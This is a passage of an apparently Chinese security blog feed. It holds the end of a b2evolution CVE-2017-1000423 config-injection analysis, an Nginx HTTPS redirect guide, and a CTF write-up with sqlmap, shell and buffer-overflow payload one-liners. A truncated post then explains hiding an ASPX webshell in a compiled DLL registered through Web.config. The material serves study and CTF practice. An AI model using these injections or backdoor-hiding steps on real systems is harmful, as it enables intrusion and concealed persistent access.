class="line"><span class="keyword">if</span>( ! $params[<span class="string">'quick_install'</span>] )</span><br><span class="line">&#123; <span class="comment">// Switch to menu only on standard installation:</span></span><br><span class="line">$action = <span class="string">'menu'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中针对baseurl的处理如下，即替换单引号<code>&#39;</code>为<code>\&#39;</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"baseurl = '"</span>.str_replace( <span class="string">"'"</span>, <span class="string">"\'"</span>, $params[<span class="string">'baseurl'</span>] ).<span class="string">"';"</span></span><br></pre></td></tr></table></figure><p>字符串baseurl处理后如下:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/b2evolution/</span>\\\<span class="string">';phpinfo();//</span></span><br></pre></td></tr></table></figure></p><p>所以导致了单引号的逃逸，紧接着调用save_to_file存入/conf/_basic_config.php文件。</p><p>4.打开/conf/_basic_config.php文件内容如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$baseurl = <span class="string">'http://localhost/b2evolution/\\'</span>;phpinfo();<span class="comment">//';</span></span><br></pre></td></tr></table></figure></p><p>5.shell地址：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/b2evolution/</span></span><br></pre></td></tr></table></figure></p><h2 id="0x03小结"><a href="#0x03小结" class="headerlink" title="0x03小结"></a>0x03小结</h2><p>这个漏洞需要在重装的时候才能利用，可以结合任意文件删除漏洞利用。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00前言&quot;&gt;&lt;a href=&quot;#0x00前言&quot; class=&quot;headerlink&quot; title=&quot;0x00前言&quot;&gt;&lt;/a&gt;0x00前言&lt;/h2&gt;&lt;p&gt;好久没有更新博客了，看到b2evolution6.6.0 - 6.8.10被爆出安装过程过滤不严导致Getshell漏洞（CVE-2017-1000423），简单分析一下。&lt;br&gt;
    
    </summary>
    
      <category term="Security" scheme="http://blackwolfsec.cc/categories/Security/"/>
    
    
      <category term="Security" scheme="http://blackwolfsec.cc/tags/Security/"/>
    
  </entry>
  
  <entry>
    <title>Nginx配置HTTPS与http运维实践</title>
    <link href="http://blackwolfsec.cc/2017/11/29/nginx_http_https/"/>
    <id>http://blackwolfsec.cc/2017/11/29/nginx_http_https/</id>
    <published>2017-11-29T13:46:39.000Z</published>
    <updated>2017-12-01T00:46:56.953Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>最近采用Linux+Nginx+PHP+Mysql的方式搭建一个CodeIgniter框架的系统，需求为除了某个特定URL采用HTTP访问以外，其余均强制采用HTTPS访问。<br><a id="more"></a></p><h2 id="0x01系统搭建"><a href="#0x01系统搭建" class="headerlink" title="0x01系统搭建"></a>0x01系统搭建</h2><ul><li>服务器配置ubuntu+nginx+mysql+php5配置，参考链接：<a href="https://www.digitalocean.com/community/tutorials/how-to-install-linux-nginx-mysql-php-lemp-stack-on-ubuntu-14-04" title="How To Install Linux, nginx, MySQL, PHP (LEMP) stack on Ubuntu 14.04 " target="_blank" rel="noopener">How To Install Linux, nginx, MySQL, PHP (LEMP) stack on Ubuntu 14.04</a></li><li>HTTPS配置，参考链接：<a href="https://www.digitalocean.com/community/tutorials/how-to-secure-nginx-with-let-s-encrypt-on-ubuntu-14-04" title="https://www.digitalocean.com/community/tutorials/how-to-secure-nginx-with-let-s-encrypt-on-ubuntu-14-04" target="_blank" rel="noopener">How To Secure Nginx with Let’s Encrypt on Ubuntu 14.04</a></li></ul><h2 id="0x02特定URL采用HTTP访问以外，其余均强制采用HTTPS访问的Nginx配置"><a href="#0x02特定URL采用HTTP访问以外，其余均强制采用HTTPS访问的Nginx配置" class="headerlink" title="0x02特定URL采用HTTP访问以外，其余均强制采用HTTPS访问的Nginx配置"></a>0x02特定URL采用HTTP访问以外，其余均强制采用HTTPS访问的Nginx配置</h2><ol><li><p>按照前面系统搭建过程安装并配置、选择采用全部重定向HTTPS的默认配置文件如下:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span> default_server;</span><br><span class="line">    <span class="attribute">listen</span> [::]:<span class="number">80</span> default_server ipv6only=<span class="literal">on</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">root</span> /usr/share/nginx/html;</span><br><span class="line">    <span class="attribute">index</span> index.php index.html index.htm;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">server_name</span> 域名或IP地址;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ =<span class="number">404</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">error_page</span> <span class="number">404</span> /<span class="number">404</span>.html;</span><br><span class="line">    <span class="attribute">error_page</span> <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span> /50x.html;</span><br><span class="line">    <span class="attribute">location</span> = /50x.html &#123;</span><br><span class="line">        <span class="attribute">root</span> /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> =<span class="number">404</span>;</span><br><span class="line">        <span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+\.php)(/.+)$</span>;</span><br><span class="line">        <span class="attribute">fastcgi_pass</span> unix:/var/run/php5-fpm.sock;</span><br><span class="line">        <span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">        <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">        <span class="attribute">include</span> fastcgi_params;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl; <span class="comment"># managed by Certbot</span></span><br><span class="line">    <span class="attribute">ssl_certificate</span> fullchain.pem文件路径; <span class="comment"># managed by Certbot</span></span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> privkey.pem文件路径; <span class="comment"># managed by Certbot</span></span><br><span class="line">    <span class="attribute">include</span> /etc/letsencrypt/options-ssl-nginx.conf; <span class="comment"># managed by Certbot</span></span><br><span class="line">    <span class="attribute">ssl_dhparam</span> /etc/letsencrypt/ssl-dhparams.pem; <span class="comment"># managed by Certbot</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="attribute">if</span> (<span class="variable">$scheme</span> != <span class="string">"https"</span>) &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">301</span> https://<span class="variable">$host</span><span class="variable">$request_uri</span>;</span><br><span class="line">    &#125; <span class="comment"># managed by Certbot</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>根据需求添加对CodeIgniter框架的支持和某个特定URL采用HTTP访问，其余均强制采用HTTPS访问。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server;</span><br><span class="line">    listen [::]:80 default_server ipv6only=on;</span><br><span class="line"></span><br><span class="line">    root /usr/share/nginx/html;</span><br><span class="line">    index index.php index.html index.htm;</span><br><span class="line"></span><br><span class="line">    server_name 域名;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        try_files <span class="variable">$uri</span> <span class="variable">$uri</span>/ =404;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location /二级目录/ &#123;</span><br><span class="line">        try_files <span class="variable">$uri</span> /二级目录/index.php;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error_page 404 /404.html;</span><br><span class="line">    error_page 500 502 503 504 /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root /usr/share/nginx/html;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ \.php$ &#123;</span><br><span class="line">        try_files <span class="variable">$uri</span> =404;</span><br><span class="line">        fastcgi_split_path_info ^(.+\.php)(/.+)$;</span><br><span class="line">        fastcgi_pass unix:/var/run/php5-fpm.sock;</span><br><span class="line">        fastcgi_index index.php;</span><br><span class="line">        fastcgi_param   PATH_INFO <span class="variable">$fastcgi_path_info</span>;</span><br><span class="line">        fastcgi_param SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">        include fastcgi_params;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    listen 443 ssl; <span class="comment"># managed by Certbot</span></span><br><span class="line">    ssl_certificate /etc/letsencrypt/live/域名/fullchain.pem; <span class="comment"># managed by Certbot</span></span><br><span class="line">    ssl_certificate_key /etc/letsencrypt/live/域名/privkey.pem; <span class="comment"># managed by Certbot</span></span><br><span class="line">    include /etc/letsencrypt/options-ssl-nginx.conf; <span class="comment"># managed by Certbot</span></span><br><span class="line">    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; <span class="comment"># managed by Certbot</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span> <span class="variable">$flag</span> 0;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$scheme</span> != <span class="string">"https"</span>) &#123;</span><br><span class="line">        <span class="built_in">set</span> <span class="variable">$flag</span> <span class="string">"<span class="variable">$&#123;flag&#125;</span>1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$request_uri</span> != <span class="string">"特定的URL"</span>) &#123;</span><br><span class="line">        <span class="built_in">set</span> <span class="variable">$flag</span> <span class="string">"<span class="variable">$&#123;flag&#125;</span>2"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$flag</span> = <span class="string">"012"</span>) &#123;</span><br><span class="line">        <span class="built_in">return</span> 301 https://<span class="variable">$host</span><span class="variable">$request_uri</span>;</span><br><span class="line">    &#125; <span class="comment"># managed by Certbot</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>其中主要添加如下两处配置配置：</p><ul><li><p>对CodeIgniter框架的支持</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">fastcgi_param</span>   PATH_INFO <span class="variable">$fastcgi_path_info</span>;</span><br></pre></td></tr></table></figure></li><li><p>某个特定URL采用HTTP访问以外，其余均强制采用HTTPS访问添加的配置，由于Nginx的判断if条件不支持逻辑&amp;&amp;，需求的等价逻辑如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">if</span> (<span class="variable">$scheme</span> != <span class="string">"https"</span> &amp;&amp; <span class="variable">$request_uri</span> != <span class="string">"特定的URL"</span> )&#123;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">301</span> https://<span class="variable">$host</span><span class="variable">$request_uri</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>曲折的具体实现为：<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">set</span> <span class="variable">$flag</span> <span class="number">0</span>;</span><br><span class="line"><span class="attribute">if</span> (<span class="variable">$scheme</span> != <span class="string">"https"</span>) &#123;</span><br><span class="line">    <span class="attribute">set</span> <span class="variable">$flag</span> <span class="string">"<span class="variable">$&#123;flag&#125;</span>1"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="attribute">if</span> (<span class="variable">$request_uri</span> != <span class="string">"特定的URL"</span>) &#123;</span><br><span class="line">    <span class="attribute">set</span> <span class="variable">$flag</span> <span class="string">"<span class="variable">$&#123;flag&#125;</span>2"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="attribute">if</span> (<span class="variable">$flag</span> = <span class="string">"012"</span>) &#123;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">301</span> https://<span class="variable">$host</span><span class="variable">$request_uri</span>;</span><br><span class="line">&#125; <span class="comment"># managed by Certbot</span></span><br></pre></td></tr></table></figure></p><h2 id="0x03小结"><a href="#0x03小结" class="headerlink" title="0x03小结"></a>0x03小结</h2><p>通常网络上关于NginxHTTPS配置主要有两种:HTTP和HTTPS同时存在或者所有HTTP强制转发HTTPS。然而项目需要特定URL支持HTTP访问，其余URL强制采用HTTPS，所有产生了本文。此外添加$scheme != “https”的判断是为了防止请求被循环重定向导致网页无法正常访问的问题，由于Nginx配置文件不支持逻辑与（and），采用等价的配置完成需要的功能。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00前言&quot;&gt;&lt;a href=&quot;#0x00前言&quot; class=&quot;headerlink&quot; title=&quot;0x00前言&quot;&gt;&lt;/a&gt;0x00前言&lt;/h2&gt;&lt;p&gt;最近采用Linux+Nginx+PHP+Mysql的方式搭建一个CodeIgniter框架的系统，需求为除了某个特定URL采用HTTP访问以外，其余均强制采用HTTPS访问。&lt;br&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://blackwolfsec.cc/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://blackwolfsec.cc/tags/Linux/"/>
    
      <category term="Nginx" scheme="http://blackwolfsec.cc/tags/Nginx/"/>
    
      <category term="运维" scheme="http://blackwolfsec.cc/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>ISC极客嘉年华OpenCTF-2017Writeup</title>
    <link href="http://blackwolfsec.cc/2017/09/13/Openctf-2017/"/>
    <id>http://blackwolfsec.cc/2017/09/13/Openctf-2017/</id>
    <published>2017-09-12T16:00:00.000Z</published>
    <updated>2017-09-13T09:59:51.913Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h2><p>这是一次很简单很简单的CTF,就当练练手吧……<br><a id="more"></a></p><h2 id="0x01-Writeup"><a href="#0x01-Writeup" class="headerlink" title="0x01 Writeup"></a>0x01 Writeup</h2><h3 id="1-WEB"><a href="#1-WEB" class="headerlink" title="1.WEB"></a>1.WEB</h3><h4 id="1-1-variacover"><a href="#1-1-variacover" class="headerlink" title="1.1 variacover"></a><strong>1.1 variacover</strong></h4><p>请求<code>http://202.112.51.184:8103/?id=a[0]=240610708</code><br>得到flag</p><pre><code>XCTF{sTr_covcderd_AND_you_kn0W?}</code></pre><h4 id="1-2-urldecode"><a href="#1-2-urldecode" class="headerlink" title="1.2 urldecode"></a><strong>1.2 urldecode</strong></h4><p>请求<code>http://202.112.51.184:8102?id=OPE%25%34%65CTF</code><br>得到flag</p><pre><code>XCTF{UrlDeCode_oL_yOu_lol!} </code></pre><h4 id="1-3-SQL注入"><a href="#1-3-SQL注入" class="headerlink" title="1.3 SQL注入"></a><strong>1.3 SQL注入</strong></h4><p>用sqlmap注入</p><pre><code>python sqlmap.py -u &quot;http://202.112.51.184:8201?id=1&quot; --dump -T &quot;flag&quot; -D &quot;security&quot;</code></pre><p>得到flag</p><pre><code>XCTF{ut9x2a5f8t9e6s3a4g5j}</code></pre><h4 id="1-4-jsjs"><a href="#1-4-jsjs" class="headerlink" title="1.4 jsjs"></a>1.4 jsjs</h4><p>由于禁用右键功能，使用Firefox的Web Developer插件查看源代码<br>得到flag</p><pre><code>XCTF{_O0oo0O_js_is_FUNNY!}</code></pre><h3 id="2-REVERSE"><a href="#2-REVERSE" class="headerlink" title="2.REVERSE"></a>2.REVERSE</h3><h4 id="OpenReverse"><a href="#OpenReverse" class="headerlink" title="OpenReverse"></a><strong>OpenReverse</strong></h4><p>下载文件，直接用notepade++打开，看到flag:</p><pre><code>XCTF{5eacs6y8p1o9gitc9521}</code></pre><h3 id="3-PWN"><a href="#3-PWN" class="headerlink" title="3.PWN"></a>3.PWN</h3><h4 id="3-1-getshell"><a href="#3-1-getshell" class="headerlink" title="3.1 getshell"></a><strong>3.1 getshell</strong></h4><p>参考 <a href="https://github.com/ernw/ctf-writeups/tree/master/csaw2016/aul" target="_blank" rel="noopener">CSAW CTF 2016 aul (100) Writeup</a><br>在webshell中直接执行如下命令：<br>os.execute(“ls”)<br>os.execute(“cat flag”)<br>得到flag:</p><pre><code>XCTF{q0Cr1iwqlW*W1m8ejiK*0z9JUa1gq@n&amp;}</code></pre><h4 id="3-2-blind"><a href="#3-2-blind" class="headerlink" title="3.2 blind"></a><strong>3.2 blind</strong></h4><p>执行如下python程序<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'from struct import pack as p; print "A" * 72 + p("Q", 0x40060d)'</span> | nc <span class="number">202.112</span><span class="number">.51</span><span class="number">.184</span> <span class="number">8301</span></span><br></pre></td></tr></table></figure></p><p>得到flag:</p><pre><code>XCTF{sQ^yeLZKBVkoZ7^zOtigV5xsepBY&amp;bB7}</code></pre><h3 id="4-MISC"><a href="#4-MISC" class="headerlink" title="4.MISC"></a>4.MISC</h3><h4 id="4-1-zip"><a href="#4-1-zip" class="headerlink" title="4.1 zip"></a><strong>4.1 zip</strong></h4><p>利用Advanced ZIP Password Recovery 4.0,选择纯数字爆破得到zip解密密码为88888888，<br>解压压缩包的flag:</p><pre><code>XCTF{ke&amp;cVR3OHWHx42ZygOceozE6KIxz1Zzj}</code></pre><h4 id="4-2-pcap"><a href="#4-2-pcap" class="headerlink" title="4.2 pcap"></a><strong>4.2 pcap</strong></h4><p>Wireshark追踪流得：<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?q=XCTF%7BRSUJecDZ5xFp1z1X%26Nmpt%40PZSDQ%25Gbx6%7D</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Accept</span>: text/html, application/xhtml+xml, image/jxr, */*</span><br><span class="line"><span class="attribute">Referer</span>: http://192.168.1.115/</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-Hans-CN,zh-Hans;q=0.8,en-GB;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.115</span><br><span class="line"><span class="attribute">Connection</span>: Keep-Alive</span><br></pre></td></tr></table></figure></p><p>对参数q的值URLdecode后获得flag:</p><pre><code>XCTF{RSUJecDZ5xFp1z1X&amp;Nmpt@PZSDQ%Gbx6}</code></pre><h3 id="5-CRYPTO"><a href="#5-CRYPTO" class="headerlink" title="5.CRYPTO"></a>5.CRYPTO</h3><h4 id="5-1-Maya-Cipher"><a href="#5-1-Maya-Cipher" class="headerlink" title="5.1 Maya Cipher"></a><strong>5.1 Maya Cipher</strong></h4><p>百度搜索Maya numerals的编码规则如下：</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/Maya.svg/220px-Maya.svg.png" alt="Maya numerals"><br>得到<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">584354467</span>b</span><br><span class="line"><span class="number">323031385</span>f</span><br><span class="line"><span class="number">69735</span>f636f</span><br><span class="line"><span class="number">6</span>d696e677d</span><br></pre></td></tr></table></figure></p><p>每行对应16进制解码得flag:</p><pre><code>XCTF{2018_is_coming}</code></pre><h4 id="5-2-RSA"><a href="#5-2-RSA" class="headerlink" title="5.2 RSA"></a><strong>5.2 RSA</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      g, y, x = egcd(b % a, a)</span><br><span class="line">      <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> x % m</span><br><span class="line">p = <span class="number">9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span></span><br><span class="line">q = <span class="number">11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = modinv(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line"><span class="keyword">print</span> d</span><br><span class="line">c= <span class="number">69016319356655639210194946570348715066396274579181987745484908846232464436640043461016746215950609916307004870722625663551955221548688400875709926061159609460224830151731941059363474236594094101209402353834752606848369320902191207004466087273869348206495061740962728586464640440980967989689860668335396868406</span></span><br><span class="line"></span><br><span class="line">m=pow(c,d,p*q)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"flag:"</span></span><br><span class="line"><span class="keyword">print</span> m</span><br></pre></td></tr></table></figure><p>flag:<br>554035859905981120888026046266284028688068004006280022208626</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00前言&quot;&gt;&lt;a href=&quot;#0x00前言&quot; class=&quot;headerlink&quot; title=&quot;0x00前言&quot;&gt;&lt;/a&gt;0x00前言&lt;/h2&gt;&lt;p&gt;这是一次很简单很简单的CTF,就当练练手吧……&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://blackwolfsec.cc/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://blackwolfsec.cc/tags/CTF/"/>
    
      <category term="Writeup" scheme="http://blackwolfsec.cc/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>ASPX编译dll隐藏shell&amp;Docker Remote API利用姿势</title>
    <link href="http://blackwolfsec.cc/2017/09/11/Dll-aspx&amp;docker/"/>
    <id>http://blackwolfsec.cc/2017/09/11/Dll-aspx&amp;docker/</id>
    <published>2017-09-10T16:00:00.000Z</published>
    <updated>2017-10-25T12:21:51.593Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这是很久之前的一次内部分享，整理后分享出来。<br><a id="more"></a></p><h2 id="0x01-ASPX编译Dll隐藏shell"><a href="#0x01-ASPX编译Dll隐藏shell" class="headerlink" title="0x01 ASPX编译Dll隐藏shell"></a>0x01 ASPX编译Dll隐藏shell</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ol><li>ASPX木马（copy到一个单独的文件夹,aabb.aspx为例）</li><li>aspnet_compiler.exe(安装了Microsoft .net framework后不同版本均带有此软件，2.0版默认在<code>C:\Windows\Microsoft.NET\Framework\v2.0.50727）</code></li><li>新建目标文件夹（Dll生成的位置，target为例）</li><li>ASPX运行解析环境（最好IIS,本次以PageAdmin携带的AspNet.EXE便携版解析环境为例）</li></ol><h3 id="ASPX编译Dll"><a href="#ASPX编译Dll" class="headerlink" title="ASPX编译Dll"></a>ASPX编译Dll</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aspnet_compiler.exe  -v / -p ASPX木马绝对路径 target目标文件绝对路径</span><br><span class="line">例如：aspnet_compiler.exe -v / -p C:\Users\test\Desktop\zhou4\aspx_shell\test\ C:\Users\test\Desktop\zhou4\aspx_shell\target</span><br></pre></td></tr></table></figure><p>命令执行完毕后，在target目标文件夹下的bin目录生成对应Dll文件和一些其他文件</p><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>使用我所提到的环境编译的情况下，处于功能测试目的，直接运行target目标文件夹下的AspNet.exe即可运行，浏览器访问对应的木马文件名，如aabb.aspx即可正常访问shell木马。<br><strong>然而打开aabb.aspx文件发现并没有实际内容，将其删除对木马功能没有任何影响</strong></p><h3 id="渗透实际环境"><a href="#渗透实际环境" class="headerlink" title="渗透实际环境"></a>渗透实际环境</h3><ol><li>打开编译target目录下bin/*.compiled文件,记录其中assembly（dll文件名和type的值（类名）（此处assembly=”App_Web_gsaqzno3” type=”ASP.aabb_aspx”）</li><li><p>编辑目标主机网站目录的Web.config文件，在<code>&lt;add verb</code>代码附近添加如下代码：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="built_in">add</span> <span class="keyword">verb</span>=<span class="string">"*"</span> path=<span class="string">"木马最终访问路径"</span> <span class="built_in">type</span>=<span class="string">"type的值（类名），assembly的值（dll文件名）"</span> validate=<span class="string">"True"</span>/&gt;</span><br><span class="line">例如：</span><br><span class="line">&lt;<span class="built_in">add</span> <span class="keyword">verb</span>=<span class="string">"*"</span> path=<span class="string">"aabb.aspx"</span> <span class="built_in">type</span>=<span class="string">"ASP.aabb_aspx,App_Web_amovoubm"</span> validate=<span class="string">"True"</span>/&gt;</span><br><span class="line">如果没有&lt;<span class="built_in">add</span> <span class="keyword">verb</span></span><br><span class="line">在</span><br><span class="line">&lt;<span class="built_in">system</span>.web&gt;</span><br><span class="line"># 省略其他</span><br><span class="line">    <span class="symbol">&lt;httpHandlers&gt;</span></span><br><span class="line">        &lt;<span class="built_in">add</span> <span class="keyword">verb</span>=<span class="string">"*"</span> path=<span class="string">"aabb.aspx"</span> <span class="built_in">type</span>=<span 